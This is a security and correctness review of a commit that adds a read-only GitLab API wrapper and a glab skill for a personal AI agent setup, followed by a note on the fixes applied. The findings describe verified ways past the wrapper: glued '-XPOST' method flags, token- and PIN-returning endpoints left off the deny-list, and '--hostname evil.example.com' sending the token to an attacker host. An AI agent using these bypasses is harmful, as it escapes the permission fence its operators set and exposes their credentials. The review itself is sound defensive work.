# Review: local overlay for personal agent customisations

**Commit reviewed:** `2706650` (feat: add local overlay for personal agent customisations)
**Target:** `branch-main` (unpushed commit on main, `origin/main..main`)
**Date:** 2026-08-12

## Summary

The commit adds a local overlay system so personal customisations survive re-extraction of the friend's nix-config tree: `apply_local_overlay.sh` merges `local/opencode/` into the extracted output, installs `gh-api-safe` from the nix-config source and `glab-api-safe` from `local/`, and `patch_settings.py` injects GitLab rules into `settings.json`. It also ships the `glab` skill and documents the workflow in README and AGENTS.md.

## Verification performed

- Extracted fresh (`python3 extract_agent_config.py nix-config --platform opencode --quiet`) and applied the overlay twice: idempotent, zero drift, no `--delete` on rsync.
- Ran the unit suite: 15/15 pass. `extract_agent_config.py` untouched (0-line diff).
- Confirmed `_agent_configs_*` stays gitignored; nothing extracted was committed.
- Tested the security findings against the installed wrapper and glab 1.53.0: `-XPOST` reaches the server (HTTP 401, not policy exit 64); `projects/1/access_tokens` and `user/support_pin` pass the allow-list; `--hostname evil.example.com` passes through; `glab mr ci-status` does not exist.
- Skills-lane findings verified against installed glab 1.53.0 and gitlab-org/cli main docs.

## Findings

### Security (blocking)

1. **High** — Glued short-flag method overrides bypass the argv pre-check: Phase 2 rejects only the exact tokens `-X` and `--method`, but glab's flag parser reads `-XPOST`, `-XDELETE`, `-XPATCH` and `-X=POST` as method values, so `glab-api-safe -XPOST projects/1/access_tokens` passes policy and performs a write. Verified: the request reached GitLab (HTTP 401 from the server, not exit 64 from the wrapper). Fix: reject every token matching `-X*` (and `--method=*` is handled, but add the glued form) in `local/opencode/bin/glab-api-safe.sh:150-155`.

2. **High** — Token- and PIN-returning endpoints are not on the deny-list: `projects/*/access_tokens`, `groups/*/access_tokens`, `projects/*/deploy_tokens` and `user/support_pin` all pass the allow-list (exit non-64, request reaches server). GitLab responds with `token` values on the first three and the account PIN on the last, and the first two are trivially reachable with the `-XPOST` bypass. Fix: add `*/access_tokens`, `*/deploy_tokens`, `user/support_pin` (and subpaths) to the deny-list at `glab-api-safe.sh:213-235`.

3. **High** — `--hostname` is passed through and lets the wrapper send the GitLab token to an attacker-chosen host: glab rebuilds the client for the overridden host and resolves `GITLAB_TOKEN`/`OAUTH_TOKEN` from the environment before host-specific config, and Phase 2 never rejects `--hostname` (it is in the skip list at line 113). Verified: `glab-api-safe --hostname evil.example.com user` passed policy and attempted the connection. Fix: reject `--hostname` or pin it to configured hosts.

4. **Warning** — The GitLab port dropped the upstream user-credential denies: `gh-api-safe.sh:220-228` denies `user/keys`, `user/gpg_keys`, `user/emails`, but `user/emails` and `user/keys` pass here, and bare `GET /user` returns the private primary email on an allowed path. Fix: restore `user/emails`, `user/keys`, `user/gpg_keys` to the deny-list.

### Correctness

5. **High** — The settings patch fails silently when upstream nix-config rewording drifts: `local/patch_settings.py:53` uses `rules.replace(old_tool, new_tool)` with no before/after check, so if the middle of the GitHub tool paragraph changes while the guard sentences survive, the replace no-ops, the GitLab fence still gets inserted, and the idempotency marker never appears — every subsequent run appends another duplicate fence and exits 0. Verified: two runs against a drifted copy produced two "Keep GitLab mutations" paragraphs. Fix: compare before/after the replace and fail loudly on no-op; include the "Keep GitLab mutations" marker in the idempotency check.

6. **Medium** — `apply_local_overlay.sh:69` silently skips installing `glab-api-safe` (exit 0) when `local/opencode/bin/glab-api-safe.sh` is missing, while the skill and patched rules still reference it. Verified that state. Fix: mirror the hard error used for `gh-api-safe` at lines 28-31.

### Skill content (against real glab 1.53.0)

7. **High** — `glab mr ci-status` does not exist; the whole CI-status block fails. Proof: `glab/SKILL.md:63-64`; `unknown command "ci-status"`. Fix: `glab ci status`.

8. **High** — `glab mr approve --body` does not exist; approve takes only `-s/--sha`. Proof: `SKILL.md:58`. Fix: approve plain, or `glab mr note 123 -m "LGTM"`.

9. **High** — `glab mr comment --body` and `glab issue comment --body` fail; the commands take `-m/--message`. Proof: `SKILL.md:60,99`. Fix: `glab mr note 123 -m "..."`.

10. **High** — `glab mr update --add-label` and `--add-reviewer` do not exist. Proof: `SKILL.md:67`. Fix: `--label "bug"`, `--reviewer charlie`.

11. **High** — `glab issue update --add-label` does not exist, and `glab issue edit` (named in the skill's fence list and in the patched settings.json rules, `patch_settings.py:67`) does not exist either. Fix: `--label "priority"`; rename `glab issue edit` to `glab issue update` in both fence lists.

12. **High** — `glab mr merge --delete-source-branch` and `--when-pipeline-succeeds` are wrong. Proof: `SKILL.md:54-55`. Fix: `glab mr merge 123 --squash --remove-source-branch --auto-merge`.

13. **High** — `glab ci view --log` and `--job` do not exist; view takes only `-b/--branch`, `-p/--pipelineid`, `-w/--web`. Proof: `SKILL.md:118-119`. Fix: `glab ci trace <job-id>`, which takes a job id, not a pipeline id as line 117 shows.

14. **High** — `glab ci run --ref` and `--variable` do not exist. Proof: `SKILL.md:126-127`. Fix: `glab ci run -b main --variables-env ENV=staging`.

15. **High** — `glab ci artifacts` does not exist. Proof: `SKILL.md:130-131`. Fix: `glab job artifact <ref> <job>`.

16. **High** — `glab search repo/issue/mr` do not exist. Proof: `SKILL.md:165-170`. Fix: `glab repo search`, `glab mr list --search`, `glab issue list --search`.

17. **High** — `--state` is not a flag on `glab mr list` or `glab issue list`. Proof: `SKILL.md:40,84`. Fix: `glab mr list -M`, `glab issue list` (open is default; `-c` for closed).

18. **Medium** — `glab ci list --branch` and `--pipeline-id` fail; list filters by `-r/--ref` only. Proof: `SKILL.md:109-110`. Fix: `glab ci list -r main`; `glab ci view -p <id>`.

19. **Medium** — `glab auth token` does not exist. Proof: `SKILL.md:256`. Fix: `glab auth status -t/--show-token`.

20. **Medium** — `glab mr list -g owner/other-repo` misuses the group flag, which takes a group path. Proof: `SKILL.md:159`. Fix: `glab mr list -R owner/other-repo`.

21. **Medium** — `glab release create --description` and `--assets` do not exist. Proof: `SKILL.md:139`. Fix: `glab release create v1.2.3 -N "notes" dist/*.tar.gz`.

## Clean areas

- `glab-api-safe graphql -f query='...'` works with the real CLI; the wrapper's Phase 2 shape matches.
- Overlay idempotency, target-dir selection, two-arg custom-dir form, and rsync merge all verified correct.
- `GH_TELEMETRY` export is inert (gh-only); PATH-resolved `glab` binary matches the upstream design.

## Conclusion

**Blocking.** The wrapper fails its stated read-only contract in three verified ways (method override via glued flags, credential-returning endpoints, token exfiltration via `--hostname`), and the glab skill describes a CLI that does not match the installed glab — most commands in it fail outright. The patch script also fails silently on upstream drift. All must be fixed before the overlay is used against a live GitLab account.

## Follow-up: fixes applied (2026-08-12)

All blocking findings fixed in a follow-up commit:

1. **Wrapper** (`local/opencode/bin/glab-api-safe.sh`): glued `-X*` flags and `--hostname` now rejected in Phase 2; deny-list extended with `*/access_tokens`, `*/deploy_tokens`, `user/support_pin`, `user/emails`, `user/keys`, `user/gpg_keys`. Verified: every attack vector exits 64; legitimate reads still pass.
2. **patch_settings.py**: fails loudly (exit 1) when the upstream GitHub paragraph drifts; idempotency check requires both glab markers; fence list corrected to `glab issue update`. Verified drift path and idempotency.
3. **apply_local_overlay.sh**: hard error when `glab-api-safe.sh` is missing. Verified.
4. **glab SKILL.md**: all 15 CLI errors corrected against glab 1.53.0 — `glab mr note -m`, `glab mr merge --remove-source-branch/--auto-merge`, `glab ci status/-b/--live`, `glab ci run -b/--variables-env`, `glab job artifact`, `glab repo search`, `--search`/`-M`/`-R` flags, `-F json` output, `glab auth status -t`, `glab issue update --label`, `-N` release notes, and `--hostname` documented as blocked.
5. Unit suite still passes 15/15; overlay idempotent.
